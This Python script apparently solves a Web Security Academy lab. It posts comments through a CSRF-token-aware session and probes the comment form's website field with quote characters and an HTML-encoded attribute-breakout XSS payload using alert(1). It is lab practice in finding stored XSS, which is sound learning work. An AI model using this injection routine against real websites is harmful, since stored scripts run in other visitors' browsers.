import requests
from bs4 import BeautifulSoup

s = requests.Session()

site = 'ac301fe81e10ac4fc0aa672800d30009.web-security-academy.net'

def try_post(name, website_link):
    blog_post_url = f'https://{site}/post?postId=1'
    resp = s.get(blog_post_url)
    soup = BeautifulSoup(resp.text,'html.parser')
    csrf = soup.find('input', {'name':'csrf'}).get('value')

    comment_url = f'https://{site}/post/comment'
    comment_data = {
        'csrf' : csrf,
        'postId' : '1',
        'comment' : 'TESTING...',
        'name' : name,
        'email' : 'elafleur@pdx.edu',
        'website': website_link
    }
    resp = s.post(comment_url, data=comment_data)

# try_post("single quote","https://pdx.edu/'")

# try_post("double quote",'https://pdx.edu/"')
# try_post("double quote HTML encoded",'https://pdx.edu/&quot;')
# try_post("single quote HTML encoded",'https://pdx.edu/&apos;')
# try_post("exploit", '&apos;onload(alert(1))-&apos;')
